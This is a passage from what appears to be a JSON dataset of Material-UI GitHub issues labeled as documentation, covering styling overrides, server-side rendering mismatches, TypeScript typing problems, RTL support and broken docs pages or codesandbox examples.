🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. https://material-ui.com/style/icons/#font-awesome\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.?.?  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"Hi,\r\n\r\nI try to change background color of popup menu of  Select component with styled function from styled-components, but it does not affect the component at all. \r\n\r\n```javascript\r\nconst StyledSelect = styled(Select).attrs({\r\n  MenuProps: { classes: { paper: \"paper\" } }\r\n})`\r\n  .paper {\r\n    background-color: lightgrey;\r\n  }\r\n`; \r\n```\r\n\r\n\r\n[Example CodeSandBox](https://codesandbox.io/s/5n43ojl1l)\r\n\r\nI expect background of popup menu of  StyledSelect to be lightgrey.\r\n\r\n\r\n\r\n\r\n"},{"labels":["documentation",null,null,null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\nNot sure it should be a feature or not.\r\nNot every browser by default installed the Roboto font. In browser, it takes time to download the roboto font.\r\n\r\nhttps://web.dev/fast/avoid-invisible-text\r\nHere is the avoid-invisible-text guideline.\r\nBy default, all material ui components font family are set to Roboto.\r\n \r\nI am thinking if it is possible to use fontfaceobserver to async set back the font family of all material ui element after the font is loaded.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe how it should work.\r\n-->\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Explain the difference from current behavior.\r\n-->\r\n\r\n## Examples 🌈\r\n<!---\r\n    Provide a link to the Material design specification, other implementations,\r\n    or screenshots of the expected behavior.\r\n-->\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n"},{"labels":[null,"documentation",null],"text":"modal not work with ssr, modal opened after hydrate, but specyfyc for my app must send open modal on server"},{"labels":["documentation"],"text":"Does the new `ThemeProvider` have full RTL support?\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nWith RTL enabled TextFileds, including labels and placeholders, should be right aligned.\r\n\r\n## Current Behavior 😯\r\nTextFileds seem left aligned\r\n<img width=\"259\" alt=\"screen shot 2019-01-23 at 10 17 41 am\" src=\"https://user-images.githubusercontent.com/293004/51592384-28fe7c00-1ef8-11e9-8016-e3b4509c2a6b.png\">\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/wq787oxnml\r\n\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.9.0  |\r\n| Material-UI styles  | 3.0.0-alpha.8  |\r\n| React        |     16.8.0-alpha.1    |\r\n"},{"labels":["documentation",null],"text":"### Intro\r\nI have attempted to add material-ui to the react-starter-kit project (https://github.com/kriasoft/react-starter-kit). To do this I have used the guide at: https://material-ui.com/guides/server-rendering/#css-works-on-only-on-first-load and payed extra attention to the \"React class name hydration mismatch\" section.\r\n\r\n### Current Behavior\r\n Prop `className` did not match. Server. \r\n\r\n### Expected Behavior\r\n classNames match on client and server. \r\n\r\n### Observations\r\nI understand that \"createGenerateClassName();\" can't be reused across requests. However this seems to be the case in : src/server.js:188. Further more the classNames on the server side currently seem to be incrementing on each page reload. Which does seem to indicate I'm not resetting createGenerateClassName(); for each request.\r\n\r\nFurthermore the server generated css works if you don`t remove it at src/client.js:104.\r\n\r\n### Environment / versions\r\nAll can be found in the package.json in repo below. To reproduce simply run \"yarn install\" followed by \"npm start\". For more info visit the react-starter-kit repo or see the README.md.\r\n\r\nhttps://github.com/mrmedicine/material-ui-ssr-test\r\n\r\n### Relevant code parts:\r\n```\r\n//Relevant code in src/client.js\r\nasync function onLocationChange(location, action) {\r\n    // Create a new class name generator.\r\n    const generateClassName = createGenerateClassName();\r\n\r\n    const renderReactApp = isInitialRender ? ReactDOM.hydrate : ReactDOM.render;\r\n    appInstance = renderReactApp(\r\n      <MuiThemeProvider theme={Theme} generateClassName={generateClassName}>\r\n        <App context={context}>{route.component}</App>\r\n      </MuiThemeProvider>,\r\n      container,\r\n      () => {\r\n        if (isInitialRender) {\r\n          const elem2 = document.getElementById('MUICSS');\r\n          if (elem2 && elem2.parentNode) elem2.parentNode.removeChild(elem2);\r\n          return;\r\n})\r\n}\r\n\r\n//Relevant code in src/server.js\r\napp.get( '*' , async (req, res, next) => {\r\n  try {\r\n    /*\r\n    * Material UI server side rendering : https://material-ui.com/guides/server-rendering/\r\n    * */\r\n    // Create a sheetsRegistry instance.\r\n    const sheetsRegistry = new SheetsRegistry();\r\n\r\n    // Create a sheetsManager instance.\r\n    const sheetsManager = new Map();\r\n\r\n    // Create a new class name generator.\r\n    const generateClassName = createGenerateClassName();\r\n\r\n    data.children = ReactDOM.renderToString(\r\n      <JssProvider\r\n        registry={sheetsRegistry}\r\n        generateClassName={generateClassName}\r\n      >\r\n        <MuiThemeProvider theme={Theme} sheetsManager={sheetsManager}>\r\n          <App context={context}>{route.component}</App>\r\n        </MuiThemeProvider>\r\n      </JssProvider>,\r\n    );\r\n\r\n    const muiCss = sheetsRegistry.toString();\r\n    data.styles = [{ id: 'css', cssText: [...css].join('') }];\r\n    data.styles.push({ id: 'MUICSS', cssText: muiCss });\r\n\r\n    const html = ReactDOM.renderToStaticMarkup(<Html {...data} />);\r\n    res.status(route.status || 200);\r\n    res.send(`<!doctype html>${html}`);\r\n  } catch (err) {\r\n    next(err);\r\n  }\r\n});\r\n}\r\n\r\n\r\n\r\n\r\n\r\n"},{"labels":["documentation"],"text":"Hey!\r\n\r\nI'm struggling in properly using and overriding themes. I want to use the default theme with some custom overrides (e.g. different font size).\r\n\r\nExample: https://codesandbox.io/s/j7owzjlnqv\r\n\r\n```\r\n    \"react\": \"16.8.0-alpha.1\",\r\n    \"react-dom\": \"16.8.0-alpha.1\",\r\n    \"react-scripts\": \"2.1.3\",\r\n    \"@material-ui/core\": \"3.9.0\",\r\n    \"@material-ui/styles\": \"^3.0.0-alpha.8\"\r\n```\r\n\r\nWith typescript, I _cannot_ seem to use `createMuiTheme` from `@material-ui/core/styles` as importing it gives a conflict between `jss@9` and `jss@10` (latter is used by `@material-ui/styles`)\r\n\r\nThanks!"},{"labels":[null,"documentation"],"text":"Not sure if this is a bug or if I'm just not using it right.\r\nFirst of all, link component from #14093 is very useful - so I don't need to hack\r\n\r\n```js\r\nexport default () =>\r\n  createStyles({\r\n    global: {\r\n      '& a': {\r\n        '&:hover': {\r\n          color: light\r\n        },\r\n        color: main\r\n      }\r\n    }\r\n  });\r\n```\r\n\r\nin my highest class anymore - cool.\r\nNow I wanted to change all my self-made `<a>` into mui `<Link>`.\r\nWe are using react-router-dom who also have `<Link>`/`<Navlink>`. They don't have the possibility to inject what component should be used, so I tried it the other way round:\r\n\r\n```jsx\r\n<Link\r\n    component={({ className }) => (\r\n      <NavLink className={className} to={`/myPath/${value}`} data-some-attribute=\"some-value\" title={value}>\r\n        {value}\r\n      </NavLink>\r\n    )}\r\n  >\r\n    No matter what I put here it will not be rendered\r\n  </Link>\r\n```\r\n\r\nNow my issue is, Link requires children, although they will not be rendered if the injected component has one. Can we make children optional?\r\n\r\nAlso I get a typescript error if I just pass strings to Link as href and child:\r\n\r\n```jsx\r\n<Link href=\"https://www.nasa.gov/multimedia/imagegallery/image_feature_1188.html\">NASA</Link>\r\n```\r\n\r\n```\r\nTS2322: Type '{ children: string; href: string; }' is not assignable to type 'IntrinsicAttributes & LinkProps & { children?: ReactNode; }'.   Property 'href' does not exist on type 'IntrinsicAttributes & LinkProps & { children?: ReactNode; }'.\r\n```"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\nCan't get into this page due to this error\r\n\r\n> Cannot read property 'rawHooks' of undefined\r\n\r\n<img width=\"1403\" alt=\"2019-01-16 11 14 25\" src=\"https://user-images.githubusercontent.com/12894459/51224233-eed52d80-197f-11e9-9338-ad75575fc138.png\">\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n\r\nShouldn't have errors.\r\n\r\n## Current Behavior 😯\r\n\r\nPage flash content for a second and then broken.\r\n\r\n## Steps to Reproduce 🕹\r\n\r\n[Here](https://material-ui.com/customization/themes/)\r\n\r\nAnd change language to chinese\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has this issue affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\nchrome version: 71.0.3578.98\r\n"},{"labels":["documentation",null],"text":"<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\nWe should document using the `component` override prop with Typescript in the Typescript guide.  It diverges from non-Typescript usage, and the solution I found in an issue about overriding `ListItem` with `Link` doesn't currently work.  I almost settled for using `any`, but dug some more and found that there's an open PR out to solve this: https://github.com/mui-org/material-ui/pull/13868\r\n\r\nIt'd be great if we could document it right now to let people know it's a bit of a dead end, but there's a fix waiting to be released.  Then we could update it when it goes live.  \r\n\r\nI'll see if I can draft it up.\r\n\r\n**Background context:**\r\nThe `component` override prop on components like `ListItem` and `Button` doesn't play well with Typescript.  The regular docs say you can do `<ListItem component={Link}>`.  With Typescript, you instead need to do something along the lines of `<ListItem component={({innerRef, ...props}: ListItemProps) => <Link {...props}/>}>`\r\n\r\nThis actually still doesn't work, because the signatures of the event handler callbacks that `ListItem` passes to `component` are incompatible.  You'll get:\r\n\r\n```\r\nTypes of property 'onClickCapture' are incompatible.\r\n    Type '((event: MouseEvent<HTMLElement, MouseEvent>) => void) | undefined' is not assignable to type '((event: MouseEvent<HTMLAnchorElement>) => void) | undefined'.\r\n```\r\n\r\nThere is a PR (https://github.com/mui-org/material-ui/pull/13868) open currently to solve this by allowing you to provide the component type as a generic parameter:\r\n\r\n`<ListItem<'a'> component={({innerRef, ...props}: ListItemProps) => <Link {...props}/>} button={true}>`\r\n\r\n"},{"labels":[null,"documentation",null],"text":"## Expected Behavior 🤔\r\n'title' property of Tooltip to be of a node type according to https://material-ui.com/api/tooltip/ \r\n\r\n## Current Behavior 😯\r\n'title' property of Tooltip is of a string type because title prop of the Tooltip is just simply moved to be  a title attribute of html element which is a String.\r\n\r\n## Steps to Reproduce 🕹\r\njust look at the Elements tab of a chrome dev tools. In my case it is just a H1 element with a title attribute. So I can't use any formatting there. My `<div>` is just shown as `<div>` rather than used as a node element. "},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nThe docs fails to mention that for the Tooltip to work, its props are spread to the child element.  This means that if the child is a custom React component which doesn't accept the spread props, the Tooltip does not work.\r\n\r\nFor example, this wouldn't work:\r\n\r\n```jsx\r\n<Tooltip title=\"Tooltip title\">\r\n  <ReactComponent />\r\n</Tooltip>\r\n```\r\n\r\nwhere `<ReactComponent />` is defined as,\r\n\r\n```jsx\r\nconst ReactComponent = (props) => {\r\n  return <div>ReactComponent</div>;\r\n};\r\n```\r\n\r\nHowever, spreading the props would make it work:\r\n\r\n```jsx\r\nconst ReactComponent = (props) => {\r\n  return <div {...props}>ReactComponent</div>;\r\n};\r\n```"},{"labels":[null,"documentation",null],"text":"I have found the `focusVisibleClassName` of `ButtonBase` extremly useful to control the styling of various components when the component receives focus via the keyboard, and not from the mouse. This allows us to style the components to match our application, but yet still meet WCAG AA specifications for accessibility.\r\n\r\nIt would be awesome to add this logic to `InputBase` so we would have this same flexibility from the various components that use `InputBase`, such as `Input`, `NativeSelect`, `Select`, and so on."},{"labels":["documentation"],"text":"Request headers:\r\n\r\n```\r\nGET https://material-ui.com/_next/static/RGj2NQ41jtM6Rn7n8CAzA/pages/getting-started/page-layout-examples/checkout.js\r\n\r\nHost: material-ui.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nReferer: https://material-ui.com/getting-started/page-layout-examples/checkout/\r\nConnection: keep-alive\r\nCookie: _ga=GA1.2.590574512.1545017891; lastSeenNotification=33; _gid=GA1.2.1323651612.1546759486\r\nCache-Control: max-age=0\r\nTE: Trailers\r\n```\r\n\r\nResponse headers\r\n\r\n```\r\nHTTP/2.0 404 Not Found\r\ncontent-type: text/html; charset=utf-8\r\ndate: Mon, 07 Jan 2019 17:03:07 GMT\r\netag: 1523051981-ssl\r\nstrict-transport-security: max-age=31536000; includeSubDomains; preload\r\nx-nf-srv-version: 45aaffea081549dd03a2dfff644cc25cf522edbd\r\nage: 39\r\ncontent-length: 2636\r\nserver: Netlify\r\ncache-control: public,max-age=31536000,immutable\r\nx-nf-request-id: 12d9e36d-3f18-4b49-b49b-47514973ca69-59203103\r\nX-Firefox-Spdy: h2\r\n```\r\n\r\nThe response is an HTML not found message."},{"labels":["documentation"],"text":"Clicking top level links in the sidebar do nothing. Works fine in chrome.\r\n\r\nChecked in firefox 66.0a1 (2019-01-06) (64-bit) on linux\r\n\r\n![MUIBug](https://i.imgur.com/BHcmeUV.gif)\r\n\r\ndoes Material-UI intend to support Firefox? Is it tested there?"},{"labels":["documentation"],"text":"I built a template for material-ui: https://github.com/alexanmtz/material-sense\r\n\r\nI would like to make a Pull Request to [add it to the docs](https://material-ui.com/premium-themes/), is that possible?\r\n\r\n## Context 🔦\r\nI want to have my template available at Material UI docs page, as a curated template."},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nall codesandbox examples are working\r\n\r\n## Current Behavior 😯\r\nsome codesandbox examples are broken\r\n\r\n## Steps to Reproduce 🕹\r\nClick through codesandbox examples, for example https://codesandbox.io/s/pkry7zyj8m\r\n\r\n## Steps to fix\r\nYou need to change in `package.json`\r\n```js\r\n    \"react-dom\": \"latest\",\r\n    \"react\": \"latest\",\r\n```\r\n\r\nto \r\n```js\r\n    \"react-dom\": \"next\",\r\n    \"react\": \"next\",\r\n```\r\nand add the ThemeProvider to `index.js` like this:\r\n\r\n```js\r\nimport { createMuiTheme } from \"@material-ui/core/styles\";\r\nimport { ThemeProvider } from \"@material-ui/styles\";\r\n\r\nconst theme = createMuiTheme();\r\n\r\nReactDOM.render(\r\n  <ThemeProvider theme={theme}>\r\n    <Demo />\r\n  </ThemeProvider>,\r\n  document.querySelector(\"#root\")\r\n);\r\n```\r\n\r\nSee the fixed demo: https://codesandbox.io/s/7w5zzqkjwq\r\n\r\n"},{"labels":[null,"documentation"],"text":"See attached image\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\nLayout correct\r\n\r\n## Current Behavior 😯\r\nLayout broken\r\n\r\n## Steps to Reproduce 🕹\r\nView documentation \r\n\r\nLink:\r\n\r\n1. https://material-ui.com/api/tabs/\r\n2.\r\n3.\r\n4.\r\n\r\n## Context 🔦\r\nN/A\r\n\r\n## Your Environment 🌎\r\nMac / Chrome\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.8.1  |\r\n| React        |         |\r\n| Browser      |         |\r\n| TypeScript   |         |\r\n| etc.         |         |\r\n\r\n<img width=\"1071\" alt=\"screen shot 2019-01-01 at 8 47 16 pm\" src=\"https://user-images.githubusercontent.com/5578955/50579007-aad21c80-0e06-11e9-8ba4-2310714427c0.png\">"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\n\r\nDocumentation should load in IE and look the same as it does in Chrome\r\n\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n\r\nDocumentation loads with theme and then CSS gets overwritten\r\n\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nLink:\r\n\r\n1. Load https://material-ui.com in IE11\r\n\r\n![broken_theme_ie](https://user-images.githubusercontent.com/12938082/50562661-aece4380-0d0d-11e9-896f-9a06cc04f7b5.gif)\r\n\r\nProblem still occurs after cache is cleared and in InPrivate browsing mode\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment with which you experienced the bug.\r\n    If you encounter issues with typescript please include version and tsconfig.\r\n-->\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.8.1  |\r\n| Browser      |   IE11      |\r\n| etc.         |         |\r\n"},{"labels":["documentation",null],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe how it should work.\r\n-->\r\nDocumentation for CSS to MUI webpack Loader needs to be updated with latest changes. \r\n## Current Behavior 😯\r\n<!---\r\n    Explain the difference from current behavior.\r\n-->\r\nDocumentation is existing with the older changes. \r\n## Examples 🌈\r\n<!---\r\n    Provide a link to the Material design specification, other implementations,\r\n    or screenshots of the expected behavior.\r\n-->\r\n\r\nhttps://www.npmjs.com/package/css-to-mui-loader\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI have raised one major issue under this library last month. The author has been fixed this issue and released new version of library with updated documentation. If the same changes reflected in materail-ui, it would been more helpful for readers. "},{"labels":["documentation",null],"text":"The defaultTheme specified by option in withStyle helper function, has a default value that nevers takes control inside the logic.\r\n\r\n## Expected Behavior 🤔\r\nThe behaviour of the defaultTheme fallback should take the defaultTheme passed by props instead of take the global defaultTheme declaration.\r\n\r\nhttps://github.com/mui-org/material-ui/blob/master/packages/material-ui/src/styles/withStyles.js#L95\r\n\r\n```javascript\r\nthis.theme = listenToTheme ? themeListener.initial(context) || props.defaultTheme : noopTheme;\r\n```\r\n\r\n## Context 🔦\r\nIn many test that we develop we don't want to provide a MuiThemeContext, sometimes it's usefull use a customTheme to ensure the correct style mapping. \r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.7.1  |\r\n| React        |  v16.7.0       |\r\n"},{"labels":[null,"documentation"],"text":"<!--- Provide a general summary of the feature in the Title above -->\r\nIt would be helpful for the Modal documentation to reference the higher-level components that are based on Modal. In particular, it is important to reference the Dialog component.\r\n\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [x ] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x ] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n\r\n## Examples 🌈\r\n<!---\r\n    Provide a link to the Material design specification, other implementations,\r\n    or screenshots of the expected behavior.\r\n-->\r\nWould add something along the lines of:\r\n\r\n> Modal is a lower-level construct that is leveraged by Dialog, Drawer, and Popover. If you are creating a modal dialog, you probably want to use the Dialog component rather than directly using Modal.\r\n\r\nThe words `Dialog`, `Drawer`, and `Popover` would be links to the documentation for those components. Are there any other components based on Modal? These are what I found by searching the code for \r\n\r\n> import Modal\r\n\r\n## Context 🔦\r\n<!---\r\n    What are you trying to accomplish? How has the lack of this feature affected you?\r\n    Providing context helps us come up with a solution that is most useful in the real world.\r\n-->\r\nI have seen one of my own team members, plus someone on StackOverflow who started using Modal to create a modal dialog, and then began gradually trying to reinvent solutions for issues (e.g. scrollable content) that are already solved by the Dialog component.\r\n\r\nI'm willing to take care of the pull request for this if there is agreement that this is desirable."},{"labels":[null,"documentation",null],"text":"Unknown reason TablePagination duplicate firing onChangePage without event\r\n\r\nExample component\r\n```\r\n/**\r\n * Table pagination\r\n *\r\n * @param {Object} props\r\n * @public\r\n */\r\nfunction Pagination ( { page, size, sizes, disabled, label, totalPages, changePage, changeSize } ) {\r\n    return (<TableFooter>\r\n        <TableRow>\r\n            <TablePagination\r\n                page={page}\r\n                count={totalPages}\r\n                rowsPerPage={size}\r\n                rowsPerPageOptions={sizes}\r\n                ActionsComponent={PageActions}\r\n                labelDisplayedRows={PageLabels}\r\n                // unknown reason material pagination duplicate firing function without event\r\n                onChangePage={(e, page) => changePage(page)}\r\n                labelRowsPerPage={label||(<strong> SIZE </strong>)}\r\n                onChangeRowsPerPage={e => changeSize(e.target.value)}\r\n                SelectProps={{ disabled, renderValue: value => (<strong>&nbsp;{value}&nbsp;&nbsp;</strong>) }}\r\n                    />\r\n        </TableRow>\r\n    </TableFooter>);\r\n}\r\n/**\r\n * Pagination actions\r\n *\r\n * @param {Object} props\r\n * @public\r\n */\r\nfunction PageActions ({ className, count, page, onChangePage, disabled }) {\r\n    let disableNext = disabled || page >= count;\r\n    let disablePrev = disabled || page === 0;\r\n    return (<div className={className}>\r\n        <Tooltip title=\"First Page\" placement=\"bottom\" enterDelay={300}><span>\r\n            <IconButton onClick={e=>onChangePage(e, 0)} disabled={disablePrev} aria-label=\"First Page\">\r\n                <FirstPage />\r\n            </IconButton>\r\n        </span></Tooltip>\r\n        <Tooltip title=\"Prev Page\" placement=\"bottom\" enterDelay={300}><span>\r\n            <IconButton onClick={e=>onChangePage(e, page-1)} disabled={disablePrev} aria-label=\"Previous Page\">\r\n                <KeyboardArrowLeft />\r\n            </IconButton>\r\n        </span></Tooltip>\r\n        <Tooltip title=\"Next Page\" placement=\"bottom\" enterDelay={300}><span>\r\n            <IconButton onClick={e=>onChangePage(e, page+1)} disabled={disableNext} aria-label=\"Next Page\">\r\n                <KeyboardArrowRight />\r\n            </IconButton>\r\n        </span></Tooltip>\r\n        <Tooltip title=\"Last Page\" placement=\"bottom\" enterDelay={300}><span>\r\n            <IconButton onClick={e=>onChangePage(e, count-1)} disabled={disableNext} aria-label=\"Last Page\">\r\n                <LastPage />\r\n            </IconButton>\r\n        </span></Tooltip>\r\n    </div>);\r\n}\r\n```\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | ^3.4.0  |\r\n| React        |  ^16.2.0 |\r\n| Browser      |   Any      |\r\n"},{"labels":["documentation"],"text":"- [x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n`<Select>` should accept `native` as `boolean` attribute.\r\n\r\n## Current Behavior 😯\r\n`<Select>` expects `native` as `string` attribute.\r\n\r\nIt works  though when I set `native=\"true\"`.\r\n\r\n\r\n## Steps to Reproduce 🕹\r\nhttps://codesandbox.io/s/zl1w5wry74\r\n\r\n```\r\nWarning: Received `true` for a non-boolean attribute `native`.\r\n\r\nIf you want to write it to the DOM, pass a string instead: native=\"true\" or native={value.toString()}.\r\n```\r\n\r\nwhat's weird though is this error is not present in https://codesandbox.io/s/243vrppnvy\r\n\r\n## Context 🔦\r\nNothing much special, just webpack 4.\r\n\r\n## Your Environment 🌎\r\n\r\n| Tech         | Version |\r\n|--------------|---------|\r\n| Material-UI  | v3.7.1  |\r\n| React        | v 16.7.0 |\r\n| Browser      | Chrome latest |\r\n"},{"labels":[null,"documentation",null],"text":"<!--- Provide a general summary of the issue in the Title above -->\r\nI open the codesandbox example, but it says it requires to install a dependency in order to run. It doesn't run after installing that dependency though\r\n<!--\r\n    Thank you very much for contributing to Material-UI by creating an issue! ❤️\r\n    To avoid duplicate issues we ask you to check off the following list.\r\n-->\r\n\r\n<!-- Checked checkbox should look like this: [x] -->\r\n- [ x] This is not a v0.x issue. <!-- (v0.x is no longer maintained) -->\r\n- [ x] I have searched the [issues](https://github.com/mui-org/material-ui/issues) of this repository and believe that this is not a duplicate.\r\n\r\n## Expected Behavior 🤔\r\n<!---\r\n    Describe what should happen.\r\n-->\r\nI expect codesandbox example to work \"out of the box\"\r\n## Current Behavior 😯\r\n<!---\r\n    Describe what happens instead of the expected behavior.\r\n-->\r\n![image](https://user-images.githubusercontent.com/10218892/50204864-411e3100-0377-11e9-999b-bc6eb2295692.png)\r\nAfter adding that dependency it says:\r\n`ModuleNotFoundError: Could not find module in path: 'date-fns/addDays' relative to '/node_modules/@date-io/date-fns/build/index.js'`\r\n## Steps to Reproduce 🕹\r\n<!---\r\n    Provide a link to a live example (you can use codesandbox.io) and an unambiguous set of steps to reproduce this bug.\r\n    Include code to reproduce, if relevant (which it most likely is).\r\n\r\n    This codesandbox.io template _may_ be a good starting point:\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app\r\n\r\n    If you're using typescript a better starting point would be\r\n    https://codesandbox.io/s/github/mui-org/material-ui/tree/master/examples/create-react-app-with-typescript\r\n\r\n    If YOU DO NOT take time to provide a codesandbox.io reproduction, should the COMMUNITY take time to help you?\r\n\r\n-->\r\nFind the example in docs, click `Edit in codesandbox`\r\n\r\n## Your Environment 🌎\r\n<!---\r\n    Include as many relevant details about the environment 